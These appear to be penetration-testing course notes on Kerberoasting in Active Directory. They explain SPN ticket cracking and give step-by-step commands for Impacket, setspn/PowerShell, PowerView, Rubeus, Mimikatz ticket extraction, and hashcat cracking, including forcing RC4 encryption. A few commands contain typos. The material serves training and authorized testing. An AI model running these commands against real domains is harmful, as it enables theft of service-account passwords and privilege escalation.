# Kerberoasting

In this section will cover:
- Kerberoasting - from Linux
- Kerberoasting - from Windows

**Kerberoasting Overview**

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

**Kerberoasting - Performing the Attack**

Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

Several tools can be utilized to perform the attack:
- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.


## Kerberoasting - from Linux

### Kerberoasting with GetUserSPNs.py

**Setup**
````bash
https://github.com/fortra/impacket

# Installing Impacket using Pip
$ sudo python3 -m pip install .

# Verify if GetUserSPNs.py is installed
$ GetUserSPNs.py -h
$ impacket-GetUserSPNs -h
````
**Usage**
````bash
# Listing SPN Accounts with GetUserSPNs.py
$ GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user>
$ impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user>

# Requesting all TGS Tickets
$ GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request
$ impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request

# Requesting a Single TGS ticket
$ GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested>
$ impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested>

# Saving the TGS Ticket to an Output File
$ GetUserSPNs.py -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested> -outputfile tgs
$ impacket-GetUserSPNs -dc-ip <DC_IP> <domain>/<user> -request-user <user_requested> -outputfile tgs
````
**Crack**
````bash
# Cracking the Ticket Offline with Hashcat
$ hashcat -m 13100 tgs /usr/share/wordlists/rockyou.tx
````

## Kerberoasting - from Windows

### Kerberoasting - Semi Manual method

As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.

**setspn.exe**
````powershell
# Enumerating SPNs with setspn.exe
> setspn.exe -Q */*

# Targeting a Single User
> Add-Type -AssemblyName System.IdentityModel
> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<user>/<domain"

# Retrieving All Tickets Using setspn.exe
> setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
````
Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):
- The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
- System.IdentityModel is a namespace that contains different classes for building security token services
- We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
- We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

**Extracting Tickets from Memory with Mimikatz**
````cmd
# base64 /out:true
# kerberos::list /export 
````
If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

**Cracking**
````bash
# Preparing the Base64 Blob for Cracking
$ echo "<base64 blob>" |  tr -d \\n

# Placing the Output into a File as .kirbi
$ cat encoded_file | base64 -d > <file>.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py
$ python2.7 kirbi2john.py <file>.kirbi

# Modifiying crack_file for Hashcat
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > tgs_hashcat

# Cracking the Hash with Hashcat
$ hashcat -m 13100 tgs_hashcat /usr/share/wordlists/rockyou.txt
````
If we decide to skip the base64 output with Mimikatz and type mimikatz `# kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.

### Automated / Tool Based Route

#### PowerView

Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.
````powershell
# Using PowerView to Enumerate SPN Accounts
> Import-Module .\PowerView.ps1
> Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
> Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
````

#### Rubeus
````powershell
> .\Rubeus.exe

# Using the /stats Flag
> .\Rubeus.exe kerberoast /stats

# Using the /nowrap Flag
> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
````
**A Note on Encryption Types**

Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.
````powershell
# Received the TGS ticket RC4 (type 23) encrypted
> .\Rubeus.exe kerberoast /user:testspn /nowrap
$krb5tgs$23$*testspn$

# Requesting a new ticket with AES-256 (type 18) encryption
>  .\Rubeus.exe kerberoast /user:testspn /nowrap
$krb5tgs$18$testspn$

# Cracking AES-256 (type 18)
$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
````
We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
